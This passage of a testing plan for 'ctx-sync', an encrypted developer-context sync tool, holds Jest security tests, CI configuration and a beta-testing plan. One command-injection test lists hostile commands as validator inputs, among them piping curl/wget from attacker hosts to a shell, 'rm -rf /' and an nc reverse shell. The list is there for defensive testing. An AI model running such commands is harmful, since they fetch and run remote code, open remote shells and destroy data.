    expect(ageFiles).toContain('mental-context.age');
    expect(ageFiles).toContain('services.age');
  });

  it('should not contain ANY plaintext state in Git history', async () => {
    await trackProject('my-app');
    await addEnvVar('SECRET', 'my-secret-value');
    await sync();

    const gitLog = execSync('git log -p --all', {
      cwd: path.join(global.TEST_DIR, '.context-sync'),
      encoding: 'utf-8'
    });

    // No plaintext secrets
    expect(gitLog).not.toContain('my-secret-value');
    // No plaintext project paths
    expect(gitLog).not.toContain('/projects/my-app');
    // No plaintext hostnames
    expect(gitLog).not.toContain(os.hostname());
    // No JSON structure (everything encrypted)
    expect(gitLog).not.toContain('"currentTask"');
    expect(gitLog).not.toContain('"gitBranch"');
  });

  it('manifest.json should contain ONLY version and timestamps', async () => {
    await trackProject('my-app');
    await sync();

    const manifest = await fs.readJson(
      path.join(global.TEST_DIR, '.context-sync', 'manifest.json')
    );

    // Only allowed fields
    const allowedKeys = ['version', 'lastSync', 'files'];
    expect(Object.keys(manifest)).toEqual(expect.arrayContaining(allowedKeys));

    // No project names, paths, or hostnames
    const manifestStr = JSON.stringify(manifest);
    expect(manifestStr).not.toContain('my-app');
    expect(manifestStr).not.toContain('/projects/');
    expect(manifestStr).not.toContain(os.hostname());
  });

  it('should reject writing unencrypted state to disk', async () => {
    const plaintextState = { projects: [{ name: 'test' }] };

    await expect(writeStateToDisk('state.json', plaintextState))
      .rejects.toThrow('Cannot write unencrypted state');
  });
});
```

### 2. Secret Leak Prevention Tests

```javascript
// test/security/secret-leak.test.js
describe('Security: Secret Leak Prevention', () => {
  it('should encrypt ALL env vars by default (no plaintext distinction)', async () => {
    const envVars = {
      NODE_ENV: 'development',   // "safe" value
      PORT: '3000',              // "safe" value
      STRIPE_KEY: 'sk_live_123', // obvious secret
      CUSTOM_VAR: 'some-value'   // unknown -- should still be encrypted
    };

    await importEnvVars('my-app', envVars);
    await sync();

    // Read the raw file on disk -- should be encrypted blob
    const raw = await fs.readFile(
      path.join(global.TEST_DIR, '.context-sync', 'env-vars.age'),
      'utf-8'
    );

    // None of these should appear in the file
    expect(raw).not.toContain('development');
    expect(raw).not.toContain('3000');
    expect(raw).not.toContain('sk_live_123');
    expect(raw).not.toContain('some-value');
    expect(raw).toContain('-----BEGIN AGE ENCRYPTED FILE-----');
  });

  it('should never write decrypted env vars to temp files', async () => {
    const tmpDir = os.tmpdir();
    const tmpFilesBefore = await fs.readdir(tmpDir);

    await addEnvVar('SECRET', 'value');
    await sync();

    const tmpFilesAfter = await fs.readdir(tmpDir);
    const newFiles = tmpFilesAfter.filter(f => !tmpFilesBefore.includes(f));

    // No new temp files containing our secret
    for (const file of newFiles) {
      const content = await fs.readFile(path.join(tmpDir, file), 'utf-8')
        .catch(() => '');
      expect(content).not.toContain('value');
    }
  });

  it('should sanitize secrets from log output', async () => {
    const logOutput = [];
    const origLog = console.log;
    console.log = (...args) => logOutput.push(args.join(' '));

    try {
      process.env.DEBUG = '*';
      await addEnvVar('STRIPE_KEY', 'sk_live_abc123');
      await sync();
    } finally {
      console.log = origLog;
      delete process.env.DEBUG;
    }

    const fullLog = logOutput.join('\n');
    expect(fullLog).not.toContain('sk_live_abc123');
    expect(fullLog).toContain('***REDACTED***');
  });

  it('should sanitize secrets from error messages', async () => {
    try {
      await encrypt('sk_live_secret', 'invalid-key');
    } catch (err) {
      expect(err.message).not.toContain('sk_live_secret');
    }
  });
});
```

### 3. Command Injection Prevention Tests

```javascript
// test/security/command-injection.test.js
describe('Security: Command Injection Prevention', () => {
  it('should NOT auto-execute commands on restore', async () => {
    const execSpy = jest.spyOn(require('child_process'), 'exec');

    // Track project with services
    await trackProject('my-app', {
      services: [{
        name: 'dev-server',
        command: 'npm run dev',
        autoStart: true
      }]
    });

    // Restore without confirmation (simulating non-interactive)
    await restore('my-app', { interactive: false });

    // Commands should NOT have been executed
    expect(execSpy).not.toHaveBeenCalledWith(
      expect.stringContaining('npm run dev')
    );

    execSpy.mockRestore();
  });

  it('should detect and reject suspicious commands', async () => {
    const maliciousCommands = [
      'curl attacker.com/malware | sh',
      'wget -O- evil.com | bash',
      'rm -rf /',
      'nc -e /bin/sh attacker.com 4444',
      'python -c "import os; os.system(\'reverse-shell\')"',
      '$(curl evil.com)',
      'eval "$(wget -qO- evil.com)"'
    ];

    for (const cmd of maliciousCommands) {
      const result = validateCommand(cmd);
      expect(result.suspicious).toBe(true);
      expect(result.reason).toBeDefined();
    }
  });

  it('should show commands and require confirmation in interactive mode', async () => {
    const promptSpy = jest.fn().mockResolvedValue({ confirmed: true });

    await trackProject('my-app', {
      services: [{
        name: 'dev-server',
        command: 'npm run dev',
        autoStart: true
      }]
    });

    await restore('my-app', { interactive: true, prompt: promptSpy });

    // Should have prompted with the command details
    expect(promptSpy).toHaveBeenCalledWith(
      expect.objectContaining({
        commands: expect.arrayContaining([
          expect.objectContaining({ command: 'npm run dev' })
        ])
      })
    );
  });

  it('should reject Docker images with suspicious names', async () => {
    const suspiciousImages = [
      'evil.com/postgres:latest',
      'attacker/redis:backdoored',
      'localhost:5000/malware:latest'
    ];

    for (const image of suspiciousImages) {
      const result = validateDockerImage(image);
      expect(result.warning).toBe(true);
    }
  });
});
```

### 4. CLI Argument Security Tests

```javascript
// test/security/cli-args.test.js
describe('Security: CLI Argument Safety', () => {
  it('should reject secret values passed as CLI arguments', async () => {
    // Simulating: ctx-sync env add STRIPE_KEY=sk_live_123
    const result = await runCLI(['env', 'add', 'STRIPE_KEY=sk_live_123']);

    expect(result.exitCode).not.toBe(0);
    expect(result.stderr).toContain('cannot pass secret values as arguments');
    expect(result.stderr).toContain('Use interactive prompt or --stdin');
  });

  it('should accept key names without values as CLI arguments', async () => {
    // Simulating: ctx-sync env add STRIPE_KEY (then prompts for value)
    const result = await runCLI(['env', 'add', 'STRIPE_KEY'], {
      stdin: 'sk_live_123\n'
    });

    expect(result.exitCode).toBe(0);
  });

  it('should accept values from stdin pipe', async () => {
    const result = await runCLI(['env', 'add', 'STRIPE_KEY', '--stdin'], {
      stdin: 'sk_live_123'
    });

    expect(result.exitCode).toBe(0);
  });

  it('should use hidden input for interactive secret entry', async () => {
    // Verify the prompt library is configured with hidden: true
    const promptConfig = getEnvAddPromptConfig();
    expect(promptConfig.type).toBe('password');
  });

  it('should not expose secrets in process title', async () => {
    // process.title should not contain secret values
    await addEnvVar('SECRET', 'my-value');
    expect(process.title).not.toContain('my-value');
  });
});
```

### 5. File Permission Tests

```javascript
// test/security/file-permissions.test.js
describe('Security: File Permissions', () => {
  it('should set key file permissions to 600', async () => {
    await initCtxSync();

    const keyPath = path.join(global.TEST_DIR, '.config', 'ctx-sync', 'key.txt');
    const stats = await fs.stat(keyPath);
    const mode = stats.mode & 0o777;

    expect(mode).toBe(0o600);
  });

  it('should set config directory permissions to 700', async () => {
    await initCtxSync();

    const configDir = path.join(global.TEST_DIR, '.config', 'ctx-sync');
    const stats = await fs.stat(configDir);
    const mode = stats.mode & 0o777;

    expect(mode).toBe(0o700);
  });

  it('should refuse to load key with insecure permissions', async () => {
    await initCtxSync();

    const keyPath = path.join(global.TEST_DIR, '.config', 'ctx-sync', 'key.txt');
    await fs.chmod(keyPath, 0o644); // Insecure!

    await expect(loadKey(global.TEST_DIR))
      .rejects.toThrow('insecure permissions');
  });

  it('should warn and fix permissions on startup', async () => {
    await initCtxSync();

    const keyPath = path.join(global.TEST_DIR, '.config', 'ctx-sync', 'key.txt');
    await fs.chmod(keyPath, 0o644);

    const result = await runCLI(['key', 'verify']);

    expect(result.stderr).toContain('insecure permissions');
    expect(result.stderr).toContain('Expected 600');
  });
});
```

### 6. Transport Security Tests

```javascript
// test/security/transport.test.js
describe('Security: Transport Validation', () => {
  it('should accept SSH remotes', () => {
    expect(() => validateRemoteUrl('git@github.com:user/repo.git')).not.toThrow();
  });

  it('should accept HTTPS remotes', () => {
    expect(() => validateRemoteUrl('https://github.com/user/repo.git')).not.toThrow();
  });

  it('should reject HTTP remotes', () => {
    expect(() => validateRemoteUrl('http://github.com/user/repo.git'))
      .toThrow('Insecure Git remote');
  });

  it('should reject Git protocol remotes', () => {
    expect(() => validateRemoteUrl('git://github.com/user/repo.git'))
      .toThrow('Insecure Git remote');
  });

  it('should reject FTP remotes', () => {
    expect(() => validateRemoteUrl('ftp://server.com/repo.git'))
      .toThrow('Insecure Git remote');
  });

  it('should validate remote on every sync operation', async () => {
    const validateSpy = jest.spyOn(transport, 'validateRemoteUrl');

    await sync();

    expect(validateSpy).toHaveBeenCalled();
    validateSpy.mockRestore();
  });
});
```

### 7. Key Management Tests

```javascript
// test/security/key-management.test.js
describe('Security: Key Management', () => {
  it('should rotate key and re-encrypt all state', async () => {
    // Setup with original key
    await initCtxSync();
    const originalKey = await getPublicKey();

    await addEnvVar('SECRET', 'my-value');
    await sync();

    // Rotate key
    await rotateKey();
    const newKey = await getPublicKey();

    expect(newKey).not.toBe(originalKey);

    // Verify re-encryption
    const envVarsAge = await fs.readFile(
      path.join(global.TEST_DIR, '.context-sync', 'env-vars.age'),
      'utf-8'
    );

    // Old key should NOT decrypt new files
    await expect(decryptWithKey(envVarsAge, originalKey))
      .rejects.toThrow();

    // New key should decrypt
    const decrypted = await decryptWithKey(envVarsAge, newKey);
    expect(decrypted).toContain('my-value');
  });

  it('should rewrite Git history on key rotation', async () => {
    await initCtxSync();
    await addEnvVar('SECRET', 'old-value');
    await sync();

    // Get old commit hash
    const oldLog = execSync('git log --format="%H"', {
      cwd: path.join(global.TEST_DIR, '.context-sync'),
      encoding: 'utf-8'
    });

    await rotateKey();

    // Verify history was rewritten
    const newLog = execSync('git log --format="%H"', {
      cwd: path.join(global.TEST_DIR, '.context-sync'),
      encoding: 'utf-8'
    });

    expect(newLog).not.toBe(oldLog);
  });

  it('should revoke team member key and re-encrypt', async () => {
    const alice = generateKey();
    const bob = generateKey();

    await initCtxSync({ recipients: [alice.publicKey, bob.publicKey] });
    await addEnvVar('SHARED_SECRET', 'team-value');
    await sync();

    // Revoke bob
    await revokeKey(bob.publicKey);

    // Bob should NOT decrypt
    const envVarsAge = await fs.readFile(
      path.join(global.TEST_DIR, '.context-sync', 'env-vars.age'),
      'utf-8'
    );

    await expect(decrypt(envVarsAge, bob.privateKey))
      .rejects.toThrow();

    // Alice should still decrypt
    const decrypted = await decrypt(envVarsAge, alice.privateKey);
    expect(decrypted).toContain('team-value');
  });
});
```

### 8. Path Traversal Tests

```javascript
// test/security/path-traversal.test.js
describe('Security: Path Traversal Prevention', () => {
  it('should reject paths outside HOME directory', () => {
    const maliciousPaths = [
      '/etc/passwd',
      '/etc/shadow',
      '/usr/bin/malware',
      '/tmp/../../etc/passwd',
      '../../../etc/shadow'
    ];

    for (const p of maliciousPaths) {
      expect(() => validateProjectPath(p))
        .toThrow('Path must be within home directory');
    }
  });

  it('should resolve and validate symlinks', async () => {
    // Create symlink pointing outside HOME
    const symlinkPath = path.join(global.TEST_DIR, 'evil-link');
    await fs.symlink('/etc', symlinkPath);

    expect(() => validateProjectPath(symlinkPath))
      .toThrow('Symlink target outside allowed directory');
  });

  it('should normalize path traversal attempts', () => {
    const traversalPaths = [
      '~/projects/../../../etc/passwd',
      '~/./projects/../../etc/shadow',
      '~/projects/my-app/../../../../tmp/evil'
    ];

    for (const p of traversalPaths) {
      expect(() => validateProjectPath(p))
        .toThrow();
    }
  });

  it('should accept valid project paths', () => {
    const validPaths = [
      '~/projects/my-app',
      '~/code/api-server',
      `${os.homedir()}/Documents/work/project`
    ];

    for (const p of validPaths) {
      expect(() => validateProjectPath(p)).not.toThrow();
    }
  });
});
```

### 9. Memory Safety Tests

```javascript
// test/security/memory-safety.test.js
describe('Security: Memory Safety', () => {
  it('should zero out secret buffers after use', async () => {
    const secretBuffer = Buffer.from('my-secret-value');

    await withSecret(secretBuffer, async (buf) => {
      // Use the secret
      await encrypt(buf.toString(), publicKey);
    });

    // Buffer should be zeroed out
    expect(secretBuffer.every(byte => byte === 0)).toBe(true);
  });

  it('should not retain decrypted secrets in closure scope', async () => {
    let capturedSecret = null;

    await decryptAndUse(encryptedData, privateKey, (secret) => {
      // Use secret temporarily
      capturedSecret = secret; // This should be cleared
    });

    // After the callback, secret should be cleared
    // (Implementation should clear the variable)
    expect(capturedSecret).toBeNull();
  });
});
```

### 10. Merge Conflict Security Tests

```javascript
// test/security/merge-conflict.test.js
describe('Security: Merge Conflict Handling', () => {
  it('should detect conflicts in encrypted state files', async () => {
    // Machine A updates a secret
    const machineA = await setupMachine('A');
    await machineA.addEnvVar('SECRET', 'value-from-A');
    await machineA.sync();

    // Machine B has stale state, also updates
    const machineB = await setupMachine('B');
    await machineB.addEnvVar('SECRET', 'value-from-B');

    // Sync should detect conflict, not silently overwrite
    const result = await machineB.sync();
    expect(result.conflicts).toHaveLength(1);
    expect(result.conflicts[0].file).toBe('env-vars.age');
  });

  it('should never auto-merge encrypted files', async () => {
    const machineA = await setupMachine('A');
    const machineB = await setupMachine('B');

    await machineA.addEnvVar('KEY1', 'value1');
    await machineA.sync();

    await machineB.addEnvVar('KEY2', 'value2');

    // Should require manual resolution
    const result = await machineB.sync({ autoResolve: true });
    expect(result.autoMerged).not.toContain('env-vars.age');
  });
});
```

### Penetration Testing Scenarios (Automated)

```javascript
// test/security/pentest.test.js
describe('Security: Penetration Testing', () => {
  describe('Secret Exposure via Logs', () => {
    it('should not expose secrets with DEBUG=*', async () => {
      process.env.DEBUG = '*';
      const output = await captureOutput(async () => {
        await addEnvVar('SECRET', 'sk_live_abc123');
        await sync();
        await restore('my-app');
      });
      delete process.env.DEBUG;

      expect(output).not.toContain('sk_live_abc123');
    });

    it('should sanitize stack traces', async () => {
      try {
        await encrypt('sk_live_secret123', 'bad-key');
      } catch (err) {
        expect(err.stack).not.toContain('sk_live_secret123');
      }
    });
  });

  describe('Git History Analysis', () => {
    it('should pass full history scan for secrets', async () => {
      await addEnvVar('AWS_KEY', 'AKIAIOSFODNN7EXAMPLE');
      await addEnvVar('GITHUB_TOKEN', 'ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx');
      await addEnvVar('SLACK_TOKEN', 'xoxb-123456789-123456789-abc');
      await sync();

      const history = execSync('git log -p --all --full-history', {
        cwd: path.join(global.TEST_DIR, '.context-sync'),
        encoding: 'utf-8'
      });

      // None of these should ever appear in Git
      expect(history).not.toContain('AKIAIOSFODNN7EXAMPLE');
      expect(history).not.toContain('ghp_');
      expect(history).not.toContain('xoxb-');

      // Should not contain any JSON structure (all encrypted)
      expect(history).not.toMatch(/"value"\s*:/);
      expect(history).not.toMatch(/"password"\s*:/i);
    });
  });

  describe('Tampered State Files', () => {
    it('should detect corrupted encrypted files', async () => {
      await addEnvVar('SECRET', 'value');
      await sync();

      // Tamper with encrypted file
      const agePath = path.join(global.TEST_DIR, '.context-sync', 'env-vars.age');
      const content = await fs.readFile(agePath, 'utf-8');
      await fs.writeFile(agePath, content + 'TAMPERED');

      await expect(restore('my-app'))
        .rejects.toThrow(); // Decryption should fail
    });

    it('should handle completely replaced encrypted files', async () => {
      await addEnvVar('SECRET', 'value');
      await sync();

      // Replace with attacker's encrypted file (encrypted with different key)
      const attackerKey = generateKey();
      const malicious = await encrypt(
        JSON.stringify({ SECRET: 'malicious-value' }),
        attackerKey.publicKey
      );

      const agePath = path.join(global.TEST_DIR, '.context-sync', 'env-vars.age');
      await fs.writeFile(agePath, malicious);

      // Should fail decryption (wrong key)
      await expect(restore('my-app'))
        .rejects.toThrow();
    });
  });

  describe('Fuzzing', () => {
    it('should handle malformed .env files safely', async () => {
      const malformedInputs = [
        '',                              // Empty
        '=value',                        // No key
        'KEY=',                          // No value
        'KEY',                           // No equals
        'KEY=val\x00ue',                 // Null byte
        'KEY=' + 'A'.repeat(1000000),    // Very long value
        'KEY=val\nKEY=val2',             // Duplicate keys
        '\x00\x01\x02\x03',             // Binary data
        'KEY=val\r\nKEY2=val2',          // Windows line endings
        'export KEY=value',              // Shell export syntax
      ];

      for (const input of malformedInputs) {
        // Should not crash or leak data
        await expect(async () => {
          await importEnvFromString('my-app', input);
        }).not.toThrow();
      }
    });

    it('should handle malformed Age ciphertext safely', async () => {
      const malformedCiphertexts = [
        '',
        'not-age-data',
        '-----BEGIN AGE ENCRYPTED FILE-----\ngarbage\n-----END AGE ENCRYPTED FILE-----',
        Buffer.alloc(10000).toString('base64'),
      ];

      for (const ct of malformedCiphertexts) {
        await expect(decrypt(ct, privateKey))
          .rejects.toThrow();
        // Should not crash the process
      }
    });
  });
});
```

---

## Performance Testing

### Benchmark Tests

```javascript
// test/performance/benchmarks.test.js
const { performance } = require('perf_hooks');

describe('Performance Benchmarks', () => {
  it('should encrypt 100 secrets in < 1 second', async () => {
    const secrets = Array(100).fill('secret-value');
    
    const start = performance.now();
    
    for (const secret of secrets) {
      await encrypt(secret, publicKey);
    }
    
    const duration = performance.now() - start;
    
    expect(duration).toBeLessThan(1000);
  });

  it('should handle large state files efficiently', async () => {
    // Create state with 1000 projects
    const state = {
      projects: Array(1000).fill(null).map((_, i) => ({
        name: `project-${i}`,
        path: `/path/to/project-${i}`,
        branch: 'main'
      }))
    };

    const start = performance.now();
    
    await saveState(state);
    const loaded = await loadState();
    
    const duration = performance.now() - start;
    
    expect(duration).toBeLessThan(100); // < 100ms
    expect(loaded.projects).toHaveLength(1000);
  });

  it('should sync quickly', async () => {
    await trackProject('my-app');
    
    const start = performance.now();
    await sync();
    const duration = performance.now() - start;
    
    expect(duration).toBeLessThan(3000); // < 3 seconds
  });
});
```

### Load Testing

```bash
# test/performance/load-test.sh
#!/bin/bash

echo "Performance Load Test"
echo "===================="

# Test 1: Track 100 projects
echo "Test 1: Track 100 projects"
time for i in {1..100}; do
  ctx-sync track --project "project-$i" --no-interactive
done

# Test 2: Add 1000 env vars
echo "Test 2: Add 1000 env vars"
time for i in {1..1000}; do
  ctx-sync env add "KEY_$i=value_$i" --no-interactive
done

# Test 3: Full sync
echo "Test 3: Full sync"
time ctx-sync sync

# Test 4: Restore
echo "Test 4: Restore all projects"
time for i in {1..100}; do
  ctx-sync restore "project-$i"
done
```

---

## CI/CD Pipeline

### GitHub Actions Configuration

```yaml
# .github/workflows/test.yml
name: Test Suite

on: [push, pull_request]

jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest]
        node-version: [18.x, 20.x]

    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: ${{ matrix.node-version }}
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run linter
        run: npm run lint
      
      - name: Run unit tests
        run: npm run test:unit
      
      - name: Run integration tests
        run: npm run test:integration
      
      - name: Run E2E tests
        run: npm run test:e2e
      
      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          files: ./coverage/coverage-final.json

  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20.x

      - name: Install dependencies
        run: npm ci

      - name: NPM audit (dependency vulnerabilities)
        run: npm audit --audit-level=moderate

      - name: Run security test suite
        run: npm run test:security

      - name: Run penetration tests
        run: npm run test:pentest

      - name: Snyk security scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

      - name: Verify no plaintext secrets in test artifacts
        run: |
          # Scan test output directories for accidental secret leaks
          if grep -rn "sk_live_\|sk_test_\|ghp_\|xoxb-\|AKIA" /tmp/ctx-sync-test* 2>/dev/null; then
            echo "ERROR: Plaintext secrets found in test artifacts!"
            exit 1
          fi
```

### Package.json Scripts

```json
{
  "scripts": {
    "test": "jest",
    "test:unit": "jest test/unit",
    "test:integration": "jest test/integration",
    "test:e2e": "jest test/e2e",
    "test:security": "jest test/security",
    "test:pentest": "jest test/security/pentest.test.js",
    "test:watch": "jest --watch",
    "test:coverage": "jest --coverage",
    "test:performance": "node test/performance/benchmarks.js",
    "test:all": "npm run lint && npm run test:unit && npm run test:integration && npm run test:e2e && npm run test:security && npm run test:pentest",
    "lint": "eslint src test",
    "lint:fix": "eslint src test --fix"
  }
}
```

---

## Beta Testing Plan

### Phase 1: Internal Testing (Week 1)

**Testers:** You + 2-3 developer friends

**Focus:**
- Basic functionality works
- No critical bugs
- Installation process
- Documentation clarity

**Checklist:**
- [ ] Install on fresh machine
- [ ] Track 3+ projects
- [ ] Sync between 2 machines
- [ ] Report any crashes
- [ ] Document confusing parts

### Phase 2: Private Beta (Week 2-3)

**Testers:** 10-20 developers

**Distribution:**
- Create private npm package
- Share via GitHub issue
- Require signup form

**Metrics to Track:**
- Installation success rate
- Time to first successful sync
- Feature usage (which commands)
- Error rates
- User feedback

**Feedback Collection:**
```bash
# Built-in feedback command
ctx-sync feedback "Your feedback here"

# Automatically sends to your server or opens GitHub issue
```

### Phase 3: Public Beta (Week 4+)

**Testers:** 100+ developers

**Distribution:**
- Publish to npm as `ctx-sync@beta`
- Post on Hacker News "Show HN"
- Tweet, LinkedIn, etc.

**Success Criteria:**
- [ ] 90%+ installation success
- [ ] < 5% critical bug rate
- [ ] Average rating > 4/5
- [ ] 50+ active users
- [ ] Positive testimonials

### Beta Testing Feedback Form

```markdown
# ctx-sync Beta Feedback

Thank you for testing ctx-sync!

## Your Setup
- OS: [ ] macOS  [ ] Linux  [ ] Windows (WSL)
- Node version: _____
- Shell: [ ] bash  [ ] zsh  [ ] fish  [ ] other: _____

## Installation (1-5)
- Ease of installation: ⭐️⭐️⭐️⭐️⭐️
- Documentation clarity: ⭐️⭐️⭐️⭐️⭐️

## Features Tested
- [ ] Project tracking
- [ ] Environment variables
- [ ] Docker state
- [ ] Mental context
- [ ] Multi-machine sync

## Issues Encountered
1. _____________________
2. _____________________
3. _____________________

## What worked well?
_____________________

## What needs improvement?
_____________________

## Would you use this daily?
[ ] Yes  [ ] Maybe  [ ] No

Why? _____________________
```

---

## Continuous Testing During Development

### Test-Driven Development Flow

```bash
# 1. Write failing test
$ npm run test:watch

# 2. Write minimal code to pass
$ vim src/core/encryption.js

# 3. Refactor
# 4. Commit when green
$ git commit -m "feat: add encryption module"

# 5. Repeat
```

### Pre-Commit Hooks

```bash
# .husky/pre-commit
#!/bin/sh

npm run lint
npm run test:unit
npm run test:security

# Verify no plaintext secrets in staged files
git diff --cached --name-only | while read file; do
  if [[ "$file" == *.json ]] && [[ "$file" != "manifest.json" ]] && [[ "$file" != "package.json" ]] && [[ "$file" != "jest.config.js" ]]; then
    echo "ERROR: Non-manifest JSON file staged: $file"
    echo "State files must be .age (encrypted), not .json"
    exit 1
  fi
done

# Only allow commit if all pass
```

---

## Debugging Failed Tests

### Useful Commands

```bash
# Run single test file
npm test -- test/unit/encryption.test.js

# Run single test
npm test -- -t "should encrypt plain text"

# Run with debugging
node --inspect-brk node_modules/.bin/jest test/unit/encryption.test.js

# See full error output
npm test -- --verbose

# Update snapshots
npm test -- -u
```

### Common Issues & Solutions

| Issue | Solution |
|-------|----------|
| "Cannot find module" | Check import paths, run `npm install` |
| "Timeout" | Increase timeout in jest.config.js |
| "Permission denied" | Check file permissions, use chmod |
| "Git not found" | Install Git, check PATH |
| Tests pass locally, fail in CI | Check environment variables, file paths |

---

## Test Coverage Goals

### Minimum Coverage Requirements

- **Unit tests:** 80% line coverage
- **Integration tests:** 60% coverage
- **Security tests:** 100% of identified attack vectors
- **Critical paths:** 100% coverage
  - Full state encryption/decryption
  - Encrypt-by-default logic & safe-list
  - Git operations (sync, push, pull)
  - Key management (generation, rotation, revocation)
  - Command confirmation on restore
  - Transport security validation
  - File permission enforcement
  - Path validation & sanitization
  - CLI argument safety (no secrets in args)
  - Log sanitization
  - Memory cleanup (secret buffer zeroing)

### Coverage Report

```bash
# Generate coverage report
npm run test:coverage

# View in browser
open coverage/lcov-report/index.html

# Check coverage thresholds
npm run test:coverage -- --coverageThreshold='{"global":{"lines":80}}'
```

---

## Summary: Testing Workflow

```
┌─────────────────────────────────────┐
│  Write Code                         │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  Write Unit Tests (80% coverage)    │
│  + Security unit tests              │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  Write Integration Tests            │
│  + Encryption workflow tests        │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  Write E2E Tests (Critical flows)   │
│  + Multi-machine + key rotation     │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  Security Testing (Automated)       │
│  ├─ State encryption verification   │
│  ├─ Secret leak prevention          │
│  ├─ Command injection prevention    │
│  ├─ CLI argument safety             │
│  ├─ File permission enforcement     │
│  ├─ Transport security              │
│  ├─ Key management (rotation/revoke)│
│  ├─ Path traversal prevention       │
│  ├─ Memory safety                   │
│  ├─ Merge conflict handling         │
│  └─ Penetration tests + fuzzing     │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  Manual Testing (Checklist)         │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  Performance Testing                │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  Beta Testing (10-20 users)         │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  Launch! 🚀                         │
└─────────────────────────────────────┘
```

---

## Quick Start Testing Guide

```bash
# 1. Setup
npm install
npm run test

# 2. During development
npm run test:watch

# 3. Before commit (automatic via husky pre-commit hook)
npm run lint
npm run test:unit
npm run test:security

# 4. Before merge / PR
npm run test:coverage
npm run test:integration
npm run test:e2e

# 5. Before release
npm run test:all          # Runs everything
npm run test:pentest      # Automated penetration tests
npm run test:performance

# 6. After release
# Monitor beta user feedback
# Track error rates in production
# Run ctx-sync audit on test installations
```

Good luck with testing! 🎯